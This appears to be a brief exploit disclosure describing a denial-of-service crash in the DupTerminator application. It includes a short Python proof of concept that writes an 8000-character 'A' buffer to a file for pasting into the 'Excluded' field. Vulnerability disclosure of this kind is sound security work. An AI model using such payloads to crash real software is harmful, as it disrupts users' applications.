# Author: Brian Rodríguez

##### Vulnerability #####

DupTerminator is vulnerable to a DoS condition when a long list of characters is being used in field "Excluded" text box.

Successful exploitation will causes application stop working.

I have been able to test this exploit against Windows 10.

#!/usr/bin/env python
buffer = "\x41" * 8000

try:
    f = open("payload.txt","w")
    f.write(buffer)
    f.close()
    print ("File created")
except:
    print ("File cannot be created")
